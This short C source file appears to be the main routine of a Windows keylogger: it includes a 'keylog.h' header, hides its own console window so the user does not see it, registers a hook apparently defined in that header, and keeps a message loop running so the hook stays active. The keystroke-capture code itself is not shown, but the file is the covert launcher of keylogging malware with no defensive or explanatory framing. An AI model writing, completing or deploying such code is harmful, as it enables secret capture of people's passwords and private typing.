#include <Windows.h>
#include "keylog.h"

int main(int argc, char** argv) {
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);

    int retcode = RegisterHook();

    if(retcode > 0) {
        return retcode;
    }

    MSG msg;

    while(GetMessage(&msg, NULL, 0, 0)) {

    }

    return 0;
}